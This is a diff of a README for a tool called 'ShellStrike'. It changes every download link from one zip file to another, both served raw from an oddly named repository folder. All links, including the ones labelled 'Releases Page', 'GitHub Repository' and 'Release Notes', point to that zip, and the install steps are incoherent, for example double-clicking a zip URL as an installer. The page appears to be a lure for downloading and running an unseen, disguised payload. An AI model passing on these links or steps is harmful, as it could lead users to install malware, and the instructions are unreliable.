@@ -6,11 +6,11 @@ Welcome to ShellStrike! This application helps you perform powerful tasks with e
 
 ## 📥 Download ShellStrike
 
-[![Download ShellStrike](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip%20ShellStrike-v1.0-brightgreen)](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip)
+[![Download ShellStrike](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip%20ShellStrike-v1.0-brightgreen)](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip)
 
 To get started, visit the link below to download the latest version of ShellStrike:
 
-[Download ShellStrike from Releases Page](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip)
+[Download ShellStrike from Releases Page](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip)
 
 ## ⚙️ System Requirements
 
@@ -27,21 +27,21 @@ Now, let's go through the steps to install ShellStrike on your computer.
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download ShellStrike from Releases Page](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip)
+   [Download ShellStrike from Releases Page](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip)
 
 2. **Choose the Right File**  
    Once on the Releases page, look for the latest version. You will see files available for download. Select the file that matches your operating system:
-   - For Windows: `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip`
-   - For macOS: `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip`
-   - For Linux: `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip`
+   - For Windows: `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip`
+   - For macOS: `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip`
+   - For Linux: `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip`
 
 3. **Download the File**  
    Click on the appropriate file to start the download. Your browser will save it to your download folder.
 
 4. **Run the Installer**  
-   - **Windows**: Double-click the `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip` file. Follow the prompts on the installer.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip` file. Follow the prompts on the installer.
    - **macOS**: Open the downloaded `.dmg` file. Drag ShellStrike into your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip` file. Open a terminal and navigate to the folder. Run the command `./ShellStrike`.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip` file. Open a terminal and navigate to the folder. Run the command `./ShellStrike`.
 
 5. **Follow the On-Screen Instructions**  
    Complete the installation by following any additional on-screen instructions. The application will set up everything you need to start using ShellStrike.
@@ -76,7 +76,7 @@ A: If you face any problems, please check the issues section on our GitHub page 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip)
-- [Release Notes](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/ShellStrike.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip)
+- [Release Notes](https://raw.githubusercontent.com/WilliamLCardoso/ShellStrike/main/endosmometer/Strike_Shell_1.5-alpha.2.zip)
 
 Thank you for choosing ShellStrike! Enjoy simplifying your command line tasks with our powerful tool.
